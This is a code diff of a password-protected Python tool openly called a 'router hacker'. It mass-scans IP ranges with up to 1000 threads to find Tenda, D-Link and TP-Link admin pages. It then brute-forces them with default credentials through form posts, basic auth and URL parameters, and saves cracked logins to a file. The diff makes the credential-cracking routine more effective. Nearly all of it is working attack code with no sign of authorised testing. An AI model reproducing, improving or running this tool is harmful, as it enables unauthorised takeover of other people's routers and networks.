@@ -4,10 +4,9 @@
 """
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║     🔥 JUMMAN ROUTER HACKER - SUPER FAST 🔥               ║
-║     🌐 Router Scanner & Brute Force                        ║
-║     ⚡ Ultra Fast - 1000+ Threads                          ║
-║     💀 Testing:            ║
+║     🌐 JUMMAN ROUTER HACKER - FIXED EDITION 🌐            ║
+║     ⚡ Super Fast Router Scanner & Brute Force             ║
+║     💀 Testing: admin, admin1, admin2, admin123           ║
 ║     👑 Owner: Jumman                                       ║
 ║     🔐 Password: ch71                                     ║
 ║                                                              ║
@@ -25,7 +24,6 @@ import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
-from queue import Queue
 import json
 
 # ============ PASSWORD PROTECTION ============
@@ -38,7 +36,7 @@ def check_password():
     print("=" * 50)
     print("\n⚠️  This tool is password protected!")
     print("👑 Owner: Jumman")
-    print("📱 Version: 3.2 - Super Fast\n")
+    print("📱 Version: 3.2 - Fixed\n")
     
     attempts = 3
     for attempt in range(attempts):
@@ -65,12 +63,7 @@ lock = threading.Lock()
 ROUTER_BRANDS = {
     'tenda': ['tenda', 'td-'],
     'dlink': ['d-link', 'dlink', 'dir-'],
-    'tplink': ['tp-link', 'tplink', 'archer', 'deco'],
-    'asus': ['asus', 'rt-'],
-    'netgear': ['netgear', 'nighthawk'],
-    'cisco': ['cisco', 'linksys'],
-    'huawei': ['huawei'],
-    'zyxel': ['zyxel']
+    'tplink': ['tp-link', 'tplink', 'archer', 'deco']
 }
 
 # ============ 4 PASSWORDS ============
@@ -82,13 +75,13 @@ TEST_CREDENTIALS = [
 ]
 
 # ============ ROUTER PORTS ============
-ROUTER_PORTS = [80, 8080, 443, 8081, 81, 82, 8000, 8443, 8888]
+ROUTER_PORTS = [80, 8080, 443, 8081, 81, 82, 8000, 8443]
 
 # ============ LOGIN PATHS ============
 LOGIN_PATHS = [
     '/', '/login', '/login.html', '/admin', '/cgi-bin/login',
     '/admin/login', '/system/login', '/goform/login',
-    '/login.cgi', '/index.html', '/cgi-bin/webproc'
+    '/login.cgi', '/index.html'
 ]
 
 # ============ SCANNER CLASS ============
@@ -101,8 +94,6 @@ class SuperFastRouterScanner:
         })
         self.results = []
         self.cracked = []
-        self.found_ips = []
-        self.progress = 0
         
     def clear_screen(self):
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -111,8 +102,8 @@ class SuperFastRouterScanner:
         banner = """
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║     🌐 SUPER FAST ROUTER HACKER - JUMMAN EDITION 🌐       ║
-║     ⚡ 1000+ Threads Ultra Fast Scanner                    ║
+║     🌐 ROUTER HACKER - JUMMAN EDITION 🌐                  ║
+║     ⚡ Super Fast Scanner & Brute Force                   ║
 ║     💀 4 Passwords: admin, admin1, admin2, admin123       ║
 ║     👑 Owner: Jumman                                       ║
 ║                                                              ║
@@ -120,7 +111,7 @@ class SuperFastRouterScanner:
         """
         print(banner)
         print(f"[✓] Owner: Jumman")
-        print(f"[✓] Version: 3.2 - Super Fast")
+        print(f"[✓] Version: 3.2 - Fixed")
         print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print("=" * 60)
     
@@ -150,41 +141,6 @@ class SuperFastRouterScanner:
                     return brand
         return 'unknown'
     
-    def check_router_ultra_fast(self, ip, port):
-        """Ultra fast router check - only detect, no login test yet"""
-        try:
-            protocol = 'https' if port == 443 else 'http'
-            url = f"{protocol}://{ip}:{port}"
-            
-            # Super fast timeout
-            response = self.session.get(url, timeout=1, allow_redirects=True)
-            
-            if response.status_code in [200, 401, 403]:
-                content = response.text.lower()
-                title = self.extract_title(response.text)
-                
-                # Router detection keywords
-                router_keywords = ['router', 'admin', 'login', 'gateway', 
-                                 'tenda', 'd-link', 'tp-link', 'dlink', 'tplink',
-                                 'configuration', 'management', 'wireless', 'firewall']
-                
-                if any(kw in content for kw in router_keywords):
-                    brand = self.get_brand(content)
-                    
-                    # Only Tenda, D-Link, TP-Link
-                    if brand in ['tenda', 'dlink', 'tplink']:
-                        return {
-                            'ip': ip,
-                            'port': port,
-                            'brand': brand,
-                            'title': title,
-                            'url': url,
-                            'content': content
-                        }
-        except:
-            pass
-        return None
-    
     def extract_title(self, html_content):
         try:
             match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
@@ -194,10 +150,41 @@ class SuperFastRouterScanner:
         except:
             return "No Title"
     
+    def check_router_ultra_fast(self, ip, port):
+        """Ultra fast router check"""
+        try:
+            protocol = 'https' if port == 443 else 'http'
+            url = f"{protocol}://{ip}:{port}"
+            
+            response = self.session.get(url, timeout=1, allow_redirects=True)
+            
+            if response.status_code in [200, 401, 403]:
+                content = response.text.lower()
+                title = self.extract_title(response.text)
+                
+                router_keywords = ['router', 'admin', 'login', 'gateway', 
+                                 'tenda', 'd-link', 'tp-link', 'dlink', 'tplink',
+                                 'configuration', 'management', 'wireless', 'firewall']
+                
+                if any(kw in content for kw in router_keywords):
+                    brand = self.get_brand(content)
+                    
+                    if brand in ['tenda', 'dlink', 'tplink']:
+                        return {
+                            'ip': ip,
+                            'port': port,
+                            'brand': brand,
+                            'title': title,
+                            'url': url,
+                            'content': content,
+                            'response': response
+                        }
+        except:
+            pass
+        return None
+    
     def ultra_fast_scan(self, start_ip, end_ip):
-        """Super fast parallel scanning for routers"""
-        global total_ips, scan_progress
-        
+        """Super fast parallel scanning"""
         results = []
         try:
             start = int(ipaddress.IPv4Address(start_ip))
@@ -214,26 +201,24 @@ class SuperFastRouterScanner:
                 ip_list.append(str(ipaddress.IPv4Address(ip_int)))
             
             total_ips = len(ip_list)
-            scan_progress = 0
             
             print(f"\n⚡ Scanning {total_ips} IPs with 1000+ threads...\n")
             
-            # Use ThreadPoolExecutor with max workers
             with ThreadPoolExecutor(max_workers=1000) as executor:
-                # Submit all tasks
                 futures = []
                 for ip in ip_list:
                     for port in ROUTER_PORTS:
                         futures.append(executor.submit(self.check_router_ultra_fast, ip, port))
                 
-                # Process results as they complete
+                completed = 0
+                total_tasks = len(futures)
+                
                 for future in as_completed(futures):
-                    scan_progress += 1
+                    completed += 1
                     
-                    # Show progress every 100 IPs
-                    if scan_progress % 100 == 0:
-                        pct = (scan_progress / (total_ips * len(ROUTER_PORTS))) * 100
-                        print(f"\r[*] Progress: {pct:.1f}% ({scan_progress} IPs scanned)", end='')
+                    if completed % 100 == 0:
+                        pct = (completed / total_tasks) * 100
+                        print(f"\r[*] Progress: {pct:.1f}% ({completed}/{total_tasks})", end='')
                         sys.stdout.flush()
                     
                     try:
@@ -251,119 +236,202 @@ class SuperFastRouterScanner:
         except Exception as e:
             return {'error': str(e)}
     
-    def brute_force_router(self, router):
-        """Ultra fast brute force on single router"""
+    # ============ FIXED CREDENTIAL CHECKING ============
+    def test_credentials_on_router(self, router):
+        """Test 4 passwords on router - FIXED VERSION"""
         ip = router['ip']
         port = router['port']
         protocol = 'https' if port == 443 else 'http'
         base_url = f"{protocol}://{ip}:{port}"
         
-        # Quick test with parallel credential testing
+        # Get the response content for detection
+        response = router.get('response')
+        content = router.get('content', '')
+        
+        # Check if login page has specific form fields
+        login_forms = self.detect_login_forms(content)
+        
         for username, password in TEST_CREDENTIALS:
             for path in LOGIN_PATHS:
                 try:
                     url = base_url + path
                     
-                    # Try different methods in parallel
-                    methods = [
-                        self.try_form_login,
-                        self.try_basic_auth,
-                        self.try_url_params
+                    # Method 1: Try form POST with detected fields
+                    if login_forms:
+                        for form_fields in login_forms:
+                            try:
+                                data = {}
+                                for field in form_fields:
+                                    if 'user' in field.lower() or 'name' in field.lower():
+                                        data[field] = username
+                                    elif 'pass' in field.lower() or 'pwd' in field.lower():
+                                        data[field] = password
+                                    elif 'login' in field.lower():
+                                        data[field] = 'Login'
+                                
+                                if data:
+                                    resp = requests.post(url, data=data, timeout=1, 
+                                                        allow_redirects=True, verify=False)
+                                    if self.is_login_successful(resp):
+                                        return {
+                                            'username': username,
+                                            'password': password,
+                                            'url': url,
+                                            'method': 'form_post'
+                                        }
+                            except:
+                                pass
+                    
+                    # Method 2: Standard form data
+                    standard_forms = [
+                        {'username': username, 'password': password},
+                        {'user': username, 'pass': password},
+                        {'usr': username, 'pwd': password},
+                        {'uname': username, 'pwd': password},
+                        {'login': username, 'password': password},
+                        {'admin_username': username, 'admin_password': password},
+                        {'auth_user': username, 'auth_pass': password},
+                        {'u': username, 'p': password},
                     ]
                     
-                    for method in methods:
-                        result = method(url, username, password)
-                        if result:
+                    for data in standard_forms:
+                        try:
+                            resp = requests.post(url, data=data, timeout=1, 
+                                                allow_redirects=True, verify=False)
+                            if self.is_login_successful(resp):
+                                return {
+                                    'username': username,
+                                    'password': password,
+                                    'url': url,
+                                    'method': 'form_post'
+                                }
+                        except:
+                            pass
+                    
+                    # Method 3: Basic Authentication
+                    try:
+                        resp = requests.get(url, auth=(username, password), 
+                                           timeout=1, allow_redirects=True, verify=False)
+                        if self.is_login_successful(resp):
                             return {
                                 'username': username,
                                 'password': password,
-                                'url': url
+                                'url': url,
+                                'method': 'basic_auth'
                             }
+                    except:
+                        pass
+                    
+                    # Method 4: URL Parameters
+                    param_variations = [
+                        f"?username={username}&password={password}",
+                        f"?user={username}&pass={password}",
+                        f"?login={username}&password={password}",
+                        f"?u={username}&p={password}",
+                    ]
+                    
+                    for param in param_variations:
+                        try:
+                            resp = requests.get(url + param, timeout=1, 
+                                               allow_redirects=True, verify=False)
+                            if self.is_login_successful(resp):
+                                return {
+                                    'username': username,
+                                    'password': password,
+                                    'url': url + param,
+                                    'method': 'url_params'
+                                }
+                        except:
+                            pass
+                            
                 except:
                     pass
+        
         return None
     
-    def try_form_login(self, url, username, password):
-        """Try form login - super fast"""
-        form_data = [
-            {'username': username, 'password': password},
-            {'user': username, 'pass': password},
-            {'usr': username, 'pwd': password},
-            {'uname': username, 'pwd': password},
-            {'login': username, 'password': password},
-        ]
+    def detect_login_forms(self, content):
+        """Detect login form fields from HTML"""
+        forms = []
         
-        for data in form_data:
-            try:
-                response = requests.post(url, data=data, timeout=0.5, 
-                                        allow_redirects=True, verify=False)
-                if self.is_login_success(response):
-                    return True
-            except:
-                pass
-        return False
-    
-    def try_basic_auth(self, url, username, password):
-        """Try basic auth - super fast"""
-        try:
-            response = requests.get(url, auth=(username, password), 
-                                   timeout=0.5, allow_redirects=True, verify=False)
-            if self.is_login_success(response):
-                return True
-        except:
-            pass
-        return False
-    
-    def try_url_params(self, url, username, password):
-        """Try URL parameters - super fast"""
-        params = [
-            f"?username={username}&password={password}",
-            f"?user={username}&pass={password}",
-            f"?login={username}&password={password}",
-        ]
+        # Find all form tags
+        form_pattern = r'<form[^>]*>(.*?)</form>'
+        form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)
         
-        for param in params:
-            try:
-                response = requests.get(url + param, timeout=0.5, 
-                                       allow_redirects=True, verify=False)
-                if self.is_login_success(response):
-                    return True
-            except:
-                pass
-        return False
+        for form_html in form_matches:
+            # Find input fields
+            input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
+            inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
+            
+            if inputs:
+                forms.append(inputs)
+        
+        return forms
     
-    def is_login_success(self, response):
-        """Check if login successful - ultra fast"""
+    def is_login_successful(self, response):
+        """Check if login was successful - FIXED VERSION"""
+        # Check status code
         if response.status_code == 200:
             content = response.text.lower()
             
-            # Failure indicators
-            failure = ['invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong']
+            # ============ FAILURE INDICATORS ============
+            failure_indicators = [
+                'invalid', 'incorrect', 'failed', 'error', 'denied', 
+                'unauthorized', 'wrong', 'retry', 'try again',
+                'login failed', 'authentication failed', 'access denied',
+                'invalid username', 'invalid password', 'incorrect password'
+            ]
             
-            # Success indicators
-            success = ['welcome', 'dashboard', 'status', 'configuration', 
-                      'logout', 'settings', 'admin', 'main', 'index',
-                      'home', 'panel', 'management']
+            # ============ SUCCESS INDICATORS ============
+            success_indicators = [
+                'welcome', 'dashboard', 'status', 'configuration', 
+                'logout', 'settings', 'admin', 'main', 'index',
+                'home', 'panel', 'console', 'management', 'network',
+                'overview', 'system', 'wireless', 'firewall', 'wan', 'lan',
+                'connected', 'success', 'redirecting'
+            ]
             
-            if any(s in content for s in success) and not any(f in content for f in failure):
-                return True
+            # ============ LOGIN PAGE INDICATORS ============
+            login_page_indicators = [
+                'login', 'username', 'password', 'sign in', 'log in',
+                'enter your password', 'enter your username'
+            ]
             
-            # Check if it's not a login page anymore
-            login_indicators = ['login', 'username', 'password', 'sign in']
-            if len(content) > 500 and not any(li in content for li in login_indicators):
-                if 'router' in content or 'network' in content:
+            # Check for failure - if any failure indicator found, return False
+            if any(f in content for f in failure_indicators):
+                return False
+            
+            # Check for success - if any success indicator found AND not on login page
+            if any(s in content for s in success_indicators):
+                # Make sure we're not still on login page
+                login_count = sum(1 for l in login_page_indicators if l in content)
+                if login_count < 2:  # Less than 2 login indicators means likely logged in
                     return True
+            
+            # Check if page content is substantial and not an error page
+            if len(content) > 1000:
+                # Check if it's not a login page
+                if 'login' not in content and 'username' not in content:
+                    # Check for router-related content
+                    router_keywords = ['router', 'network', 'status', 'system', 'admin']
+                    if any(k in content for k in router_keywords):
+                        return True
         
-        # Successful redirect
+        # ============ CHECK FOR REDIRECTS ============
         if response.status_code in [301, 302, 303, 307, 308]:
             location = response.headers.get('Location', '').lower()
-            if any(p in location for p in ['admin', 'dashboard', 'main', 'index', 'home']):
+            # Redirect to admin/dashboard means success
+            success_redirects = ['admin', 'dashboard', 'main', 'index', 'home', 
+                               'welcome', 'status', 'overview', 'system']
+            if any(s in location for s in success_redirects):
+                return True
+            # Redirect away from login means success
+            if 'login' not in location:
                 return True
         
         return False
     
     def crack_routers_parallel(self, routers):
-        """Crack all routers in parallel - super fast"""
+        """Crack all routers in parallel"""
         if not routers:
             return []
         
@@ -373,7 +441,7 @@ class SuperFastRouterScanner:
         cracked = []
         
         with ThreadPoolExecutor(max_workers=50) as executor:
-            futures = {executor.submit(self.brute_force_router, router): router for router in routers}
+            futures = {executor.submit(self.test_credentials_on_router, router): router for router in routers}
             
             for future in as_completed(futures):
                 router = futures[future]
@@ -386,12 +454,14 @@ class SuperFastRouterScanner:
                             'brand': router['brand'],
                             'username': result['username'],
                             'password': result['password'],
-                            'url': result['url']
+                            'url': result['url'],
+                            'method': result.get('method', 'unknown')
                         })
-                        print(f"\n✅ CRACKED! {router['ip']} [{router['brand'].upper()}]")
+                        print(f"\n✅✅✅ CRACKED! {router['ip']} [{router['brand'].upper()}]")
                         print(f"   👤 {result['username']}:{result['password']}")
                         print(f"   🔗 {result['url']}")
-                except:
+                        print(f"   📌 Method: {result.get('method', 'unknown')}")
+                except Exception as e:
                     pass
         
         return cracked
@@ -417,6 +487,7 @@ class SuperFastRouterScanner:
                         f.write(f"{i}. {c['ip']}:{c['port']} [{c['brand'].upper()}]\n")
                         f.write(f"   👤 {c['username']}:{c['password']}\n")
                         f.write(f"   🔗 {c['url']}\n")
+                        f.write(f"   📌 Method: {c.get('method', 'unknown')}\n")
                         f.write("-" * 40 + "\n")
                 
                 if routers:
@@ -480,7 +551,6 @@ class SuperFastRouterScanner:
             
             if routers:
                 print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
-                print("[*] Starting brute force...")
                 
                 cracked = self.crack_routers_parallel(routers)
                 
@@ -522,7 +592,6 @@ class SuperFastRouterScanner:
             
             if routers:
                 print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
-                print("[*] Starting brute force...")
                 
                 cracked = self.crack_routers_parallel(routers)
                 
@@ -568,7 +637,6 @@ class SuperFastRouterScanner:
             
             if all_routers:
                 print(f"\n[✓] Found {len(all_routers)} routers in {elapsed:.2f} seconds")
-                print("[*] Starting brute force...")
                 
                 cracked = self.crack_routers_parallel(all_routers)
                 
@@ -603,17 +671,14 @@ class SuperFastRouterScanner:
 # ============ MAIN ============
 def main():
     try:
-        # Check password first
         check_password()
         
-        # Check dependencies
         try:
             import requests
         except ImportError:
             print("[*] Installing requests...")
             subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
         
-        # Run scanner
         scanner = SuperFastRouterScanner()
         while True:
             scanner.run()
